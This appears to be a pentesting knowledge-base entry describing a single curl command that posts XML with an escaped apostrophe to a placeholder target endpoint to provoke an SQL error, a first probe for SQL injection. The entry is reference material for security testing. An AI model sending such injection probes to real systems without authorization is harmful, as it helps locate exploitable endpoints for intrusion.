---
id: c-curl-apos-escape
data: >-
  curl -X POST -H "Content-Type: application/xml" -d
  '<xml><MainAccount>123456&apos;</MainAccount></xml>'
  http://target-subdomain.example.com/upload
tags:
  - sqli
  - xml
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.280Z'
verified: false
validated: true
submitted: true
---
# curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123456&apos;</MainAccount></xml>' http://target-subdomain.example.com/upload

## Command

```bash
curl -X POST -H "Content-Type: application/xml" -d '<xml><MainAccount>123456&apos;</MainAccount></xml>' http://target-subdomain.example.com/upload
```

## Description

Injects escaped apostrophe for SQL error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Escaped payload | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

## Expected Output

SQL error message.

## Related

- [[procedures/Trigger-SQL-Error-with-Escaped-Apostrophe]]
